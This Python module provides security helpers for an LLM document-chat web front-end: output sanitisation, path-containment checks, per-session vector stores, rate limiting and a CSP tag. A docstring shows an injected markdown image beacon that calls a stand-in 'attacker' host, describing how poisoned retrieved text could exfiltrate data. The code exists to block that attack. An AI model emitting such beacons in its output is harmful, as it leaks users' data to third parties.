"""Security helpers shared by the web front-ends.

Kept deliberately dependency-light (no Gradio, no HF ``spaces`` runtime, no network
or model loading at import) so the security-critical logic can be unit-tested in
isolation and reused by any front-end:

* ``safe_md`` / ``safe_inline`` — neutralise untrusted LLM/document output before it
  is placed into a Markdown/HTML surface (drop images & links, escape raw HTML),
  the source-side half of the anti-exfiltration / anti-injection defence.
* ``MemStore`` / ``CombinedStore`` — per-session, in-memory vector store so a
  visitor's uploads never leak into the shared read-only corpus (isolation).
* ``RateLimiter`` — best-effort per-client request throttle (denial-of-wallet).
* ``CSP_META`` — the Content-Security-Policy meta tag (blocks external image
  beacons / object embeds), the browser-side half of the exfiltration defence.
"""
from __future__ import annotations

import html
import pathlib
import re
import threading
import time
from collections import defaultdict

import numpy as np

from .schemas import RetrievedContext

# ---- caps (resource abuse / DoS) --------------------------------------------
MAX_SESSION_CHUNKS = 400
MAX_UPLOAD_FILES = 5
MAX_UPLOAD_BYTES = 12 * 1024 * 1024  # 12 MB per file

# ---- Content-Security-Policy ------------------------------------------------
# Only img/object/base are constrained, so Gradio's own scripts, fonts and styles
# are untouched and the HF iframe embed (frame-ancestors) is left alone.
CSP_META = (
    '<meta http-equiv="Content-Security-Policy" '
    "content=\"img-src 'self' data: blob:; object-src 'none'; base-uri 'self'\">"
)

# ---- output sanitisation ----------------------------------------------------
_MD_IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*(?:[a-z][a-z0-9+.\-]*:)?//[^)]*\)", re.I)


def safe_md(text: str) -> str:
    """Sanitise untrusted text for a Markdown surface: drop images and external
    links (keep their visible text) and neutralise raw HTML tags. This prevents an
    injected ``![](http://attacker/?d=…)`` beacon or ``<img>``/``<script>`` from a
    poisoned passage rendering or phoning home."""
    if not text:
        return text or ""
    text = _MD_IMAGE.sub(r"\1", text)                       # images -> alt text
    text = _MD_LINK.sub(r"\1", text)                        # external links -> text
    return text.replace("<", "&lt;").replace(">", "&gt;")  # no raw HTML tags


def safe_inline(text) -> str:
    """Escape a short display string (filename/source) shown inside markdown/HTML."""
    return html.escape(str(text or ""), quote=False).replace("`", "'")


def is_contained(path, base) -> bool:
    """True iff ``path`` resolves inside ``base`` — blocks path traversal / LFI /
    arbitrary-file-write. Relative paths are resolved against ``base``."""
    base = pathlib.Path(base).resolve()
    rp = pathlib.Path(path)
    rp = (base / rp).resolve() if not rp.is_absolute() else rp.resolve()
    return rp == base or base in rp.parents


# ---- per-session vector store isolation -------------------------------------
class MemStore:
    """Ephemeral, per-session vector store (no disk; dropped with the session).

    Caps its size at ``MAX_SESSION_CHUNKS`` so a session cannot be used to exhaust
    memory."""

    def __init__(self) -> None:
        self.embeddings = None
        self.chunks: list = []

    def add(self, chunks, embeddings) -> None:
        room = MAX_SESSION_CHUNKS - self.count()
        if room <= 0:
            return
        chunks = list(chunks)[:room]
        emb = np.asarray(embeddings, dtype="float32")[:room]
        self.embeddings = emb if self.embeddings is None else np.vstack([self.embeddings, emb])
        self.chunks.extend(chunks)

    def query(self, query_embedding, k: int = 5) -> list[RetrievedContext]:
        if self.embeddings is None or not self.chunks:
            return []
        q = np.asarray(query_embedding, dtype="float32").reshape(-1)
        sims = self.embeddings @ q
        top = np.argsort(-sims)[:k]
        return [RetrievedContext(chunk=self.chunks[i], score=float(sims[i])) for i in top]

    def count(self) -> int:
        return len(self.chunks)


class CombinedStore:
    """Read-only view over the shared seed store + one session's private store."""

    def __init__(self, *stores) -> None:
        self.stores = [s for s in stores if s is not None]

    def query(self, query_embedding, k: int = 5) -> list[RetrievedContext]:
        hits: list[RetrievedContext] = []
        for s in self.stores:
            hits.extend(s.query(query_embedding, k=k))
        hits.sort(key=lambda rc: rc.score, reverse=True)
        return hits[:k]

    def count(self) -> int:
        return sum(s.count() for s in self.stores)


# ---- best-effort rate limiting ----------------------------------------------
class RateLimiter:
    """Fixed-window per-client limiter. ``time_fn`` is injectable for tests."""

    def __init__(self, max_hits: int = 25, window: float = 300.0, time_fn=time.time) -> None:
        self.max_hits = max_hits
        self.window = window
        self._time = time_fn
        self._lock = threading.Lock()
        self._hits: dict = defaultdict(list)

    def allow(self, client_id: str) -> bool:
        now = self._time()
        with self._lock:
            hits = [t for t in self._hits[client_id] if now - t < self.window]
            self._hits[client_id] = hits
            if len(hits) >= self.max_hits:
                return False
            hits.append(now)
            return True

    @staticmethod
    def client_id(request) -> str:
        """Best-effort client identity from a Starlette/Gradio request."""
        try:
            fwd = request.headers.get("x-forwarded-for") if request else None
            if fwd:
                return fwd.split(",")[0].strip()
            if request and request.client:
                return request.client.host
        except Exception:
            pass
        return "anonymous"
